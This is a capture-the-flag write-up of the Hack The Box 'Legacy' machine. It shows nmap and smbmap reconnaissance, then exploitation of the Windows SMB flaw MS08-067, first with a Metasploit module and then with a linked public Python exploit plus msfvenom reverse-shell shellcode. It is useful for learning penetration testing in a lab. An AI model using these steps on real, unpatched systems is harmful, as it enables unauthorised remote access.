---
title:     "Hack The Box - Legacy"
tags: [windows,easy,smb,ms08-067]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/1.png)

We are going to pwn Legacy from Hack The Box. Which is a windows box based on smb exploit and I have explained in two methods.

Link : <https://www.hackthebox.eu/home/machines/profile/2>


Lets Begin with our Initial Nmap Scan.

Nmap Scan Results:

```
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000 (92%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (92%), Microsoft Windows XP SP2 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows 2000 Server (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h58m32s, deviation: 1h24m50s, median: -4h58m32s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:1d:23 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-02-24T14:47:45+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

```

## SMB:

Started with ``smbmap`` to check if there is any file.

```
root@w0lf# smbmap -H 10.10.10.4
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.4...
[+] IP: 10.10.10.4:445  Name: 10.10.10.4
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied
```

I tried the nmap scripts to check for vulnerabilities. Since the OS is Windows XP there must be.

```
root@w0lf# nmap --script smb-vuln* -p 445 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 19:20 EST
Nmap scan report for 10.10.10.4
Host is up (0.018s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

```
So the box is vulnerable to SMB exploit ``ms08-067``

```
ms - Microsoft
08 - The year of the patch was released i.e 2008
067 - The patch number i.e 067
```
> https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi

## Method 1:

> use exploit/windows/smb/ms08_067_netapi

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/2.png)

By using this method we can get the root shell easily.

## Method 2 (Without Metasploit):

> https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py

From the exploit, first we need to create shellcode with ``msfvenom``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/3.png)

```
-p This will connect back to me with a shell.
-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" - The bad characters not to use.
-f py - The output in python format.
-v shellcode - Specify a custom variable name to use for certain output formats
-a x86 and --platform windows - Describing the environment I’m attacking.
```


I created mine using the example.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/4.png)

I replaced my shellcode here 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/5.png)

So we need to enter OS version we already know its ``Windows XP`` so I used ``6``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/6.png)

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/7.png)

Started my listener on background.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-legacy/8.png)


```
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69....................
```

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993.....................
````


